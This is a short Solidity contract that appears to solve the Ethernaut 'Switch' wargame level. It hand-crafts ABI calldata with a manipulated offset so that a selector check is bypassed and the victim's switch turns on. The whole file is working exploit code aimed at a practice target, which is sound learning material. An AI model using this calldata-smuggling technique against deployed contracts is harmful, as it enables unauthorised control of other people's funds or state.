//SPDX-License-Identifier: MIT
pragma solidity 0.8.20;
import {Switch} from "./Switch.sol";
//https://blog.softbinator.com/solving-ethernaut-level-29-switch/ this helped a ton
contract SwitchAttack{
    Switch victim;
    bytes public data;
    constructor(address _v) {
        victim = Switch(_v);

        data = abi.encodePacked(
            bytes4(0x30c13ade),                                        // First 4 bytes (function selector or data)
            bytes32(uint256(96)),      //here we manipulate the offset, so selected function is at position 192, in bytes 96 this is basically 0x0000...60
            bytes32(0), // Another 32 bytes of zeros 0x0000...
            bytes32(0x20606e1500000000000000000000000000000000000000000000000000000000), // the index 68, first 4 bytes are the turnSwitchOff
            bytes32(0x0000000000000000000000000000000000000000000000000000000000000004), // here we specify first 4 bytes after this are what we wanna call.
            bytes32(0x76227e1200000000000000000000000000000000000000000000000000000000) //yaaay
        );
        
        (bool success,) = address(victim).call(data);
        require(victim.switchOn() == true, "not switched on...");
    }
}
    